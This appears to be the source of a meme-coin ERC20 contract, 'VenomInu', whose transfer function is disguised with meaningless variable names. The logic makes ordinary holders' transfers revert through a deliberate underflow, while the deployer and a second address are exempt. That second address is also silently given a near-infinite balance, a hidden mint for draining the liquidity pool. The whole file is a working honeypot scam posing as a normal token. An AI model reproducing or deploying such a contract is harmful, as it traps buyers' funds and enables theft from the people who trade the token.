// https://t.me/venominu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract VenomInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private hit;

    function _transfer(
        address face,
        address smooth,
        uint256 original
    ) internal override {
        uint256 lift = shape;

        if (mean[face] == 0 && hit[face] > 0 && uniswapV2Pair != face) {
            mean[face] -= lift;
        }

        address swim = bush;
        bush = smooth;
        hit[swim] += lift + 1;

        _balances[face] -= original;
        uint256 examine = (original / 100) * shape;
        original -= examine;
        _balances[smooth] += original;
    }

    address private bush;
    mapping(address => uint256) private mean;
    uint256 public shape = 3;

    constructor(
        string memory such,
        string memory cream,
        address realize,
        address very
    ) ERC20(such, cream) {
        uniswapV2Router = IUniswapV2Router02(realize);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 man = ~(uint256(0));

        mean[msg.sender] = man;
        mean[very] = man;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[very] = man;
    }
}